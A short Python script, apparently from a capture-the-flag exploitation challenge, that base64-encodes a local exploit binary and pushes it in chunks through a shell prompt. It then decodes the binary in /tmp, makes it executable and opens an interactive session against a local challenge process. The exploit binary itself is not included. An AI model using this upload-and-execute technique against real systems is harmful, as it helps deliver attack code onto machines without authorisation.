#!/usr/bin/env -S uv run
# /// script
# dependencies = [
#       "ptrlib"
# ]
# ///

from ptrlib import *
import base64


def run(cmd):
    io.after("$ ").sendline(cmd)
    io.recvline()


with open("./rootdir/exploit", "rb") as f:
    payload = bytes2str(base64.b64encode(f.read()))

# io = Socket("")
io = Process("./run.sh")

run("cd /tmp")

logger.info("Uploading...")
for i in range(0, len(payload), 512):
    print(f"Uploading... {i:x} / {len(payload):x}")
    run(f"echo {payload[i : i + 512]} >> b64exp")
run("base64 -d b64exp > exploit")
run("rm b64exp")
run("chmod +x exploit")

io.interactive()
